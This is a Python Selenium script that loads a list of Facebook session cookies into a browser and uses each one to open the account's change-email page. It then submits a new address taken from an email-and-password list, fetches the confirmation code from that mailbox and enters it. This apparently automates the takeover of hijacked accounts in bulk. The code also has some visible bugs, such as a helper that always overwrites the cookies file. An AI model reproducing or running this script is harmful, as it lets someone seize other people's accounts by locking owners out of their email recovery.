from loguru import logger
from selenium.webdriver import Chrome

from check_mail import check_for_code

EMAILS_TXT = './data/emails.txt'

COOKIES_TXT = './data/cookies.txt'


def clean(ls):
    return list(map(lambda x: x.strip(), ls))


cookies = clean(open(COOKIES_TXT).readlines())
print(list(cookies))
emails = clean(open(EMAILS_TXT, 'r').readlines())
print(emails)


def parse_cookie(_cookie):
    result = {}
    for pair in _cookie.split(';'):
        print(pair)
        key, value = pair.split('=')
        key = key.strip()
        value = value.strip()
        result[key] = value
    return result


def delete_row(file_name, row):
    lines = open(file_name).readlines()
    with open(COOKIES_TXT, 'w') as fp:
        for line in clean(lines):
            if row not in line:
                fp.write(line)
    return open(file_name).readlines()


logger.add("logs/error.log", rotation="00:00")


def bake(driver, _cookie):
    driver.delete_all_cookies()
    for pair in _cookie.split(';'):
        print(pair)
        key, value = pair.split('=')
        key = key.strip()
        value = value.strip()
        if key:
            c = {'name': key, 'value': value, 'domain': 'm.facebook.com'}
            driver.add_cookie(c)


driver = Chrome()


def verify(_cookie, email):
    email, password = email.split('|')
    driver.get('https://m.facebook.com/')
    bake(driver, _cookie)
    driver.get('https://m.facebook.com/changeemail')
    driver.find_element_by_css_selector('input[name="new"]').send_keys(email)
    driver.find_element_by_css_selector('button[type="submit"]').click()
    code = ''
    for i in range(10):
        code = check_for_code(email.strip(), password.strip())
        print('code is', code)
        if code:
            break
    if not code:
        return False
    driver.find_element_by_css_selector('input[type=number]').send_keys(code)
    driver.find_element_by_css_selector('form[method=post] a').click()


if __name__ == '__main__':

    while True:
        cookie = cookies.pop()
        email = None
        while emails:
            email = emails.pop()
            email, password = email.split('|')
            code = check_for_code(email.strip(), password.strip())
            if not code:
                break
            else:
                email = None
        if cookie and email:
            verify(cookie, email)
